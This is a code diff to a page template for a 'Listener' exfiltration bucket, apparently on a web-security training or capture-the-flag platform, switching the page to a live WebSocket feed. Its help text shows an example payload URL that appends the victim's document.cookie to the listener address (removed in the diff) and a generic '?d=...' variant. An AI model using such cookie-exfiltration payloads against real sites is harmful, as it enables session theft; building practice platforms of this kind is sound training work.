@@ -3,7 +3,7 @@
 {% block content %}
 <div class="page-head">
   <h1>Listener</h1>
-  <p class="progress">your private exfil bucket · last 5 min · auto-refreshing</p>
+  <p class="progress">your private exfil bucket · last 5 min · <span id="ws-status">live</span></p>
 </div>
 
 <div class="desc">
@@ -11,8 +11,9 @@
   show up on this page — other players have their own bucket.</p>
   <pre class="sql">https://listener.{{ domain }}/l/{{ lid }}</pre>
   <p class="muted">Same address works from the victim's browser and from your own machine
-  (<code>curl</code>/<code>ncat</code> reference). Tack the stolen data onto the URL, e.g.
-  <code>https://listener.{{ domain }}/l/{{ lid }}/?c=${encodeURIComponent(document.cookie)}</code>.</p>
+  (<code>curl</code>/<code>ncat</code> reference). Append whatever you exfiltrate to the URL as a
+  query string, e.g. <code>https://listener.{{ domain }}/l/{{ lid }}/?d=...</code>, and it shows up
+  in the table below.</p>
   {% if is_mine %}
   <form method="post" action="{{ url_for('listener_reset') }}" class="reset-form"
         onsubmit="return confirm('Reset your listener address? Payloads pointed at the old address will stop landing here.');">
@@ -29,7 +30,7 @@
     <thead>
       <tr><th>time</th><th>method</th><th>path / query</th><th>body</th><th>from</th></tr>
     </thead>
-    <tbody>
+    <tbody id="hits">
       {% for h in hits %}
         <tr>
           <td>{{ h.ts }}</td>
@@ -44,5 +45,42 @@
     </tbody>
   </table>
 </div>
-<script>setTimeout(function(){ location.reload(); }, 4000);</script>
+<script>
+(function () {
+  var lid = {{ lid|tojson }}, domain = {{ domain|tojson }};
+  var tbody = document.getElementById('hits'), status = document.getElementById('ws-status');
+  var EMPTY = 'No hits in the last 5 minutes. Fire a payload at your address and watch here.';
+
+  function cell(text) {
+    var td = document.createElement('td');
+    td.textContent = (text == null ? '' : text);   // textContent → no XSS from stolen data
+    return td;
+  }
+  function render(items) {
+    tbody.textContent = '';
+    if (!items.length) {
+      var tr = document.createElement('tr'), td = document.createElement('td');
+      td.colSpan = 5; td.className = 'muted'; td.textContent = EMPTY;
+      tr.appendChild(td); tbody.appendChild(tr); return;
+    }
+    items.forEach(function (h) {
+      var tr = document.createElement('tr');
+      [h.ts, h.method, h.path, h.body, h.remote].forEach(function (v) { tr.appendChild(cell(v)); });
+      tbody.appendChild(tr);
+    });
+  }
+
+  var url = (location.protocol === 'https:' ? 'wss://' : 'ws://') +
+            'listener.' + domain + '/ws/' + encodeURIComponent(lid);
+  var ws;
+  function connect() {
+    ws = new WebSocket(url);
+    ws.onopen    = function () { status.textContent = 'live'; };
+    ws.onmessage = function (e) { try { render(JSON.parse(e.data)); } catch (_) {} };
+    ws.onclose   = function () { status.textContent = 'reconnecting…'; setTimeout(connect, 2000); };
+    ws.onerror   = function () { try { ws.close(); } catch (_) {} };
+  }
+  connect();
+})();
+</script>
 {% endblock %}
